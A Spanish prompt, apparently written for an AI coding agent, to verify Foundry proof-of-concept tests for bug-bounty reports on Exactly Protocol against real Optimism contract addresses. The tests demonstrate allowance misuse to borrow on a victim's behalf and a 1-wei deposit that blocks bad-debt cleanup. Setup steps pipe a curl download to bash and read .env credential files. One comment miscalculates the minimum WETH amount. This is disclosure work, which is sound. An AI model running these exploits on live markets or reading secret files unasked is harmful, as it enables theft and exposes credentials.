# PROMPT PARA CLAUDE CODE — Verificación PoC Exactly Protocol

Copia todo lo que está abajo de la línea de guiones y pégalo en un Claude Code nuevo.

---

## INSTRUCCIONES PARA CLAUDE CODE

Eres Claude Code en una sesión de verificación técnica de bug bounty. Tu trabajo es verificar que 3 PoC de Foundry son correctos antes de submitir reportes a Immunefi.

**IMPORTANTE**: No tienes contexto previo. Toda la info necesaria está en este prompt.

---

## CONTEXTO: QUÉ ESTÁS VERIFICANDO

Tenemos 3 reportes de vulnerabilidad para Exactly Protocol (Immunefi). Los reportes están en el repo local en:
- `/home/user/carteaba/bug_bounty/reports/exactly_immunefi_report_1.md` — HIGH: Chainlink staleness
- `/home/user/carteaba/bug_bounty/reports/exactly_immunefi_report_3.md` — MEDIUM: ERC4626 allowance dual-use
- `/home/user/carteaba/bug_bounty/reports/exactly_immunefi_report_4.md` — MEDIUM: handleBadDebt dust griefing

Ya hicimos una validación previa de código fuente (verificado en github.com/exactly/protocol) y encontramos 4 errores que ya corregimos. Lo que falta es ejecutar los PoC para confirmar que los tests pasan.

---

## PASO 1 — Verificar entorno

Ejecuta en bash:
```bash
forge --version
which forge
echo $OPTIMISM_RPC
```

Si forge no está instalado:
```bash
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup
```

Si OPTIMISM_RPC no está en el entorno, busca en ~/.env, .env, o cualquier archivo de configuración del proyecto. También intenta: `cat /home/user/.env 2>/dev/null || cat /home/user/carteaba/.env 2>/dev/null`

---

## PASO 2 — Crear proyecto Foundry para tests

```bash
mkdir -p /tmp/exactly_poc_verify
cd /tmp/exactly_poc_verify
forge init --no-git --no-commit 2>/dev/null || true
```

Instalar dependencias:
```bash
cd /tmp/exactly_poc_verify
forge install foundry-rs/forge-std --no-git --no-commit 2>/dev/null || true
forge install transmissions11/solmate --no-git --no-commit 2>/dev/null || true
```

---

## PASO 3 — Crear los test files

Crea el archivo `/tmp/exactly_poc_verify/test/F4_MathVerify.t.sol` con este contenido exacto:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

/// @dev Verifica que 1 wei de USDC es suficiente para bloquear handleBadDebt()
/// Este test NO requiere fork — es pura aritmética
contract F4_MathVerifyTest is Test {

    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }

    function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / 1e18;
    }

    function test_oneWeiUSDC_blocks_handleBadDebt() public pure {
        // USDC.e en Optimism: 6 decimals, precio $1 = 100_000_000 raw (8 decimals Chainlink)
        // MarketUSDC.e adjustFactor ≈ 0.86e18 (valor típico en Exactly)

        uint256 assets      = 1;            // 1 wei de USDC
        uint256 usdcPrice   = 100_000_000; // $1.00 con 8 decimals
        uint256 decimals    = 6;
        uint256 adjustFactor = 0.86e18;

        // Replicar: assets.mulDivDown(assetPrice, 10**decimals).mulWadDown(adjustFactor)
        uint256 step1 = mulDivDown(assets, usdcPrice, 10 ** decimals);
        // = (1 * 100_000_000) / 1_000_000 = 100

        uint256 step2 = mulWadDown(step1, adjustFactor);
        // = (100 * 0.86e18) / 1e18 = 86

        // Si step2 > 0 → handleBadDebt() retorna early → bad debt nunca se limpia
        assertEq(step1, 100,  "step1 debe ser 100");
        assertEq(step2, 86,   "step2 debe ser 86");
        assertTrue(step2 > 0, "86 > 0 confirma que 1 wei USDC bloquea handleBadDebt");

        console.log("CONFIRMADO: 1 wei USDC produce check value =", step2);
        console.log("Costo del ataque: $0.000001 + gas");
    }

    function test_weth_18decimals_doesNOT_block_with_1wei() public pure {
        // WETH: 18 decimals, precio $3000 = 300_000_000_000 raw (8 decimals)
        // 1 wei de WETH NO es suficiente — se redondea a 0

        uint256 assets     = 1;
        uint256 wethPrice  = 300_000_000_000;
        uint256 decimals   = 18;
        uint256 adjustFactor = 0.82e18;

        uint256 step1 = mulDivDown(assets, wethPrice, 10 ** decimals);
        // = (1 * 300_000_000_000) / 1e18 = 0 (rounds down!)

        assertEq(step1, 0, "1 wei WETH redondea a 0 — NO bloquea");
        console.log("CONFIRMADO: 1 wei WETH no es suficiente, necesitas usar USDC");
    }

    function test_minimum_weth_to_block() public pure {
        // Cuántos wei de WETH se necesitan para bloquear?
        uint256 wethPrice    = 300_000_000_000;
        uint256 decimals     = 18;
        uint256 adjustFactor = 0.82e18;

        // Para que mulDivDown(assets, wethPrice, 1e18) >= 1
        // assets >= 1e18 / wethPrice = 1e18 / 3e11 = ~3333 wei
        uint256 minAssets = (10 ** decimals) / wethPrice + 1;

        uint256 step1 = mulDivDown(minAssets, wethPrice, 10 ** decimals);
        uint256 step2 = mulWadDown(step1, adjustFactor);

        assertTrue(step2 > 0, "Con suficientes wei de WETH si bloquea");
        console.log("Minimo wei de WETH necesario:", minAssets);
        console.log("Costo en USD:", minAssets, "/ 1e18 * 3000 = ~$0.00001");
    }
}
```

---

## PASO 4 — Ejecutar test matemático (SIN fork, debe pasar siempre)

```bash
cd /tmp/exactly_poc_verify
forge test --match-contract F4_MathVerifyTest -vvvv 2>&1
```

**Resultado esperado**: Los 3 tests pasan ✅

---

## PASO 5 — Tests con fork de Optimism (requiere OPTIMISM_RPC)

Si tienes OPTIMISM_RPC disponible, crea `/tmp/exactly_poc_verify/test/F3_AllowanceTest.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IMarket {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function approve(address spender, uint256 shares) external returns (bool);
    function borrow(uint256 assets, address receiver, address borrower) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IAuditor {
    function enterMarket(IMarket market) external;
}

/// @dev Verifica Finding 3: borrow() consume el mismo allowance que withdraw()
contract F3_AllowanceTest is Test {
    // Addresses verificados en /deployments/optimism/
    IMarket constant MARKET_USDC = IMarket(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873); // MarketUSDC.e
    IMarket constant MARKET_WETH = IMarket(0xc4d4500326981eacD020e20A81b1c479c161c7EF); // MarketWETH
    IAuditor constant AUDITOR    = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    address constant USDC_E      = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address constant WETH        = 0x4200000000000000000000000000000000000006;

    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");

    function setUp() public {
        vm.createSelectFork(vm.envString("OPTIMISM_RPC"), 130_000_000);
    }

    function test_borrowUsesWithdrawAllowance() public {
        // Setup: Alice deposita USDC y WETH como colateral
        deal(USDC_E, alice, 10_000e6);
        deal(WETH, alice, 5 ether);

        vm.startPrank(alice);
        IERC20(USDC_E).approve(address(MARKET_USDC), type(uint256).max);
        MARKET_USDC.deposit(10_000e6, alice);

        IERC20(WETH).approve(address(MARKET_WETH), type(uint256).max);
        MARKET_WETH.deposit(5 ether, alice);
        AUDITOR.enterMarket(MARKET_WETH); // WETH como colateral

        // Alice aprueba a Bob con intención de que retire — no que pida prestado
        MARKET_USDC.approve(bob, type(uint256).max);
        vm.stopPrank();

        uint256 bobUsdcBefore  = IERC20(USDC_E).balanceOf(bob);
        uint256 aliceSharesBefore = MARKET_USDC.balanceOf(alice);

        // Bob usa el allowance para BORROW en lugar de withdraw
        vm.prank(bob);
        MARKET_USDC.borrow(5_000e6, bob, alice);

        uint256 bobUsdcAfter   = IERC20(USDC_E).balanceOf(bob);
        uint256 aliceSharesAfter = MARKET_USDC.balanceOf(alice);

        assertGt(bobUsdcAfter - bobUsdcBefore, 0, "Bob recibio USDC");
        assertEq(aliceSharesAfter, aliceSharesBefore, "Shares de Alice sin cambio — tiene deuda en vez");

        console.log("CONFIRMADO F3: Bob recibio", (bobUsdcAfter - bobUsdcBefore) / 1e6, "USDC");
        console.log("Alice shares:", aliceSharesAfter, "(sin cambio)");
        console.log("Alice ahora tiene deuda de borrow de 5,000 USDC");
    }
}
```

Ejecutar:
```bash
cd /tmp/exactly_poc_verify
OPTIMISM_RPC=<tu_rpc_aqui> forge test --match-contract F3_AllowanceTest -vvvv 2>&1
```

---

## PASO 6 — Test F4 con fork

Crea `/tmp/exactly_poc_verify/test/F4_ForkTest.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IMarket {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function maxWithdraw(address owner) external view returns (uint256);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
}

interface IAuditor {
    function handleBadDebt(address account) external;
    function accountMarkets(address) external view returns (uint256);
}

/// @dev Verifica Finding 4: 1 wei USDC bloquea handleBadDebt()
contract F4_ForkTest is Test {
    IMarket constant MARKET_USDC = IMarket(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    IAuditor constant AUDITOR    = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    address constant USDC_E      = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;

    address alice    = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("OPTIMISM_RPC"), 130_000_000);
    }

    function test_oneWei_deposit_works() public {
        // Confirmar que depositar 1 wei en nombre de Alice funciona
        // y que maxWithdraw(alice) devuelve >= 1 tras el depósito

        assertEq(MARKET_USDC.maxWithdraw(alice), 0, "Alice empieza con 0");

        deal(USDC_E, attacker, 10); // 10 wei por si acaso
        vm.startPrank(attacker);
        IERC20(USDC_E).approve(address(MARKET_USDC), 10);
        MARKET_USDC.deposit(1, alice);
        vm.stopPrank();

        uint256 aliceWithdrawable = MARKET_USDC.maxWithdraw(alice);
        console.log("maxWithdraw(alice) tras 1 wei deposit:", aliceWithdrawable);

        // Si aliceWithdrawable > 0, el ataque funciona
        // (el check en handleBadDebt evaluará > 0 y retornará early)
        if (aliceWithdrawable > 0) {
            console.log("CONFIRMADO: 1 wei deposit es suficiente para el ataque");
        } else {
            console.log("NOTA: 1 wei redondea a 0 shares — probar con mas wei");
            // Esto podria pasar en un market con mucha liquidez acumulada
            // La solucion: depositar suficientes wei para obtener 1 share
        }
    }
}
```

```bash
OPTIMISM_RPC=<tu_rpc_aqui> forge test --match-contract F4_ForkTest -vvvv 2>&1
```

---

## PASO 7 — Reportar resultados

Cuando termines, dime:

1. ¿`test_oneWeiUSDC_blocks_handleBadDebt` PASS o FAIL?
2. ¿`test_borrowUsesWithdrawAllowance` PASS o FAIL? (si corriste con fork)
3. ¿`test_oneWei_deposit_works` — qué devuelve `maxWithdraw(alice)` tras el depósito?
4. ¿Cualquier error de compilación o addresses incorrectas?

**Si todos pasan → los 3 reportes están listos para submittir a Immunefi sin cambios.**

---

## CONTEXTO ADICIONAL (si necesitas buscar algo)

Repo del protocolo: `https://github.com/exactly/protocol`
- Auditor.sol: `contracts/Auditor.sol`
- Market.sol: `contracts/Market.sol`
- Deployments Optimism: `deployments/optimism/`

Addresses de referencia (verificados):
```
Auditor:        0xaEb62e6F27BC103702E7BC879AE98bceA56f027E
MarketWETH:     0xc4d4500326981eacD020e20A81b1c479c161c7EF
MarketOP:       0xa430A427bd00210506589906a71B54d6C256CEdb
MarketUSDC.e:   0x81C9A7B55A4df39A9B7B5F781ec0e53539694873
MarketUSDC:     0x6926B434CCe9b5b7966aE1BfEef6D0A7DCF3A8bb
WETH token:     0x4200000000000000000000000000000000000006
OP token:       0x4200000000000000000000000000000000000042
USDC.e token:   0x7F5c764cBc14f9669B88837ca1490cCa17c31607
```
